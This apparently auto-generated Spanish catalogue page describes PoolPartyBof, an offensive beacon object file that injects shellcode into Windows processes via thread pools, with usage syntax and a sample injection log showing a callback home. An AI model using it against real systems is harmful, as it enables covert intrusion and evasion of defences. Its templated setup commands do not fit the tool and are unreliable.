---
title: "PoolPartyBof: A beacon object file implementation of PoolParty Process Injection Technique by "
slug: "poolpartybof"
summary: "A beacon object file implementation of PoolParty Process Injection Technique by @SafeBreach and @0xDeku, that abuses Windows Thread Pools."
category: "ciberseguridad"
level: "Avanzado"
reading: 6
tags: ['defense-evasion', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es PoolPartyBof

PoolPartyBof es una herramienta de seguridad ofensiva / red team. A beacon object file implementation of PoolParty Process Injection Technique by @SafeBreach and @0xDeku, that abuses Windows Thread Pools.

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/0xEr3bus/PoolPartyBof](https://github.com/0xEr3bus/PoolPartyBof)
- **Sección del toolkit:** Defense Evasion 

## Objetivo y función

El objetivo principal de PoolPartyBof es a beacon object file implementation of poolparty process injection technique by @safebreach and @0xdeku, that abuses windows thread pools.

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

```
PoolPartyBof <Process ID> <Path To Shellcode> <Variant>
```

- Usage Examples

```
 PoolPartyBof 2136 /tmp/beacon_x64.bin 4
[*] Opening 2136 and running PoolParty with /tmp/beacon_x64.bin shellcode!
[+] host called home, sent: 314020 bytes
[+] received output:
[INFO] 	Shellcode Size: 307200 bytes
[+] received output:
[INFO] 	Starting PoolParty attack against process id: 2136
[+] received output:
[INFO]   Retrieved handle to the target process: 0000000000000670
[+] received output:
[INFO] 	Hijacked worker factory handle from the target process: 000000C96E0FF5B8
[+] received output:
[INFO] 	Hijacked timer queue handle from the target process: 000000C96E0FF5B8
[+] received output:
[INFO]   Allocated shellcode memory in the target process: 00000290C91B0000
[+] received output:
[INFO]   Written shellcode to the target process
[+] received output:
[INFO] 	Retrieved target worker factory basic information
[+] received output:
[INFO] 	Created TP_TIMER structure associated with the shellcode
[+] received output:
[INFO] 	Allocated TP_TIMER memory in the target process: 00000290C9200000 
[+] received output:
[INFO] 	Written the specially crafted TP_TIMER structure to the target process
[+] received output:
[INFO] 	Modified the target process's TP_POOL timer queue WindowsStart and Windows End to point to the specially crafted TP_TIMER
[+] received output:
[INFO] 	Set the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration
[+] received output:
[INFO] 	PoolParty att
...


## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/0xEr3bus/PoolPartyBof
cd poolpartybof

# Revisar ayuda
./poolpartybof --help 2>/dev/null || python3 -m poolpartybof --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Esta herramienta está pensada para Windows, .NET o entornos de Active Directory. No se instala de forma nativa en Termux; úsala desde una máquina virtual, un contenedor o un laboratorio con Windows/Linux completo.

## Buenas prácticas y ética

Usa PoolPartyBof únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/0xEr3bus/PoolPartyBof
- Toolkit de origen: Red Teaming Toolkit
